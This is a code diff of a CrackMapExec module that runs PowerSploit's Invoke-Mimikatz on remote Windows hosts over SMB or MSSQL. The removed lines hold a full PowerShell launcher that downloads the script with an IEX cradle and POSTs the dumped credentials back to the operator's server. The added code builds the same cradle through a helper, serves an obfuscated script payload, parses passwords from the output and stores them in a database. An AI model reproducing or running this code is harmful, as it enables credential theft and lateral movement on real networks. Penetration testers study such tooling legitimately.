@@ -1,4 +1,7 @@
-from cme.helpers import create_ps_command, get_ps_script, obfs_ps_script, validate_ntlm, write_log
+from cme.helpers.powershell import *
+from cme.helpers.misc import validate_ntlm
+from cme.helpers.logger import write_log
+from StringIO import StringIO
 from datetime import datetime
 import re
 
@@ -12,7 +15,7 @@ class CMEModule:
 
     description = "Executes PowerSploit's Invoke-Mimikatz.ps1 script"
 
-    chain_support = False
+    supported_protocols = ['mssql', 'smb']
 
     def options(self, context, module_options):
         '''
@@ -26,39 +29,24 @@ class CMEModule:
 
         #context.log.debug("Mimikatz command: '{}'".format(self.mimikatz_command))
 
-    def launcher(self, context, command):
-        launcher = '''
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Mimikatz.ps1');
-        $creds = Invoke-Mimikatz -Command '{command}';
-        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-        $request.Method = 'POST';
-        $request.ContentType = 'application/x-www-form-urlencoded';
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
-        $request.ContentLength = $bytes.Length;
-        $requestStream = $request.GetRequestStream();
-        $requestStream.Write( $bytes, 0, $bytes.Length );
-        $requestStream.Close();
-        $request.GetResponse();'''.format(server=context.server, 
-                                          port=context.server_port, 
-                                          addr=context.localip,
-                                          command=command)
-        
-        return create_ps_command(launcher)
+    def on_admin_login(self, context, connection):
 
-    def payload(self, context, command):
-        with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
-            return obfs_ps_script(ps_script.read())
+        command = "Invoke-Mimikatz -Command '{}'".format(self.command)
+        launcher = gen_ps_iex_cradle(context.server, context.localip, context.server_port, 'Invoke-Mimikatz.ps1', command)
 
-    def on_admin_login(self, context, connection, launcher, payload):
-        connection.execute(launcher)
+        ps_command = create_ps_command(launcher)
+
+        connection.execute(ps_command)
         context.log.success('Executed launcher')
 
-    def on_request(self, context, request, launcher, payload):
+    def on_request(self, context, request):
         if 'Invoke-Mimikatz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            request.wfile.write(payload)
+            with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
+                payload = obfs_ps_script(ps_script.read())
+                request.wfile.write(payload)
 
         else:
             request.send_response(404)
@@ -68,7 +56,7 @@ class CMEModule:
         """
         uniquify mimikatz tuples based on the password
         cred format- (credType, domain, username, password, hostname, sid)
-        
+
         Stolen from the Empire project.
         """
         seen = set()
@@ -113,7 +101,7 @@ class CMEModule:
 
                 lines2 = match.split("\n")
                 username, domain, password = "", "", ""
-                
+
                 for line in lines2:
                     try:
                         if "Username" in line:
@@ -126,7 +114,7 @@ class CMEModule:
                         pass
 
                 if username != "" and password != "" and password != "(null)":
-                    
+
                     sid = ""
 
                     # substitute the FQDN in if it matches
@@ -209,16 +197,14 @@ class CMEModule:
         if len(data):
             creds = self.parse_mimikatz(data)
             if len(creds):
-                context.log.success("Found credentials in Mimikatz output (domain\\username:password)")
                 for cred_set in creds:
                     credtype, domain, username, password,_,_ = cred_set
-                    
                     #Get the hostid from the DB
                     hostid = context.db.get_hosts(response.client_address[0])[0][0]
-
                     context.db.add_credential(credtype, domain, username, password, hostid)
-                    context.log.highlight('{}\\{}:{}'.format(domain, username, password))
+
+                context.log.success("Added {} credential(s) to the database".format(len(creds)))
 
             log_name = 'Mimikatz-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
             write_log(data, log_name)
-            context.log.info("Saved Mimikatz's output to {}".format(log_name))
+            context.log.info("Saved raw Mimikatz output to {}".format(log_name))
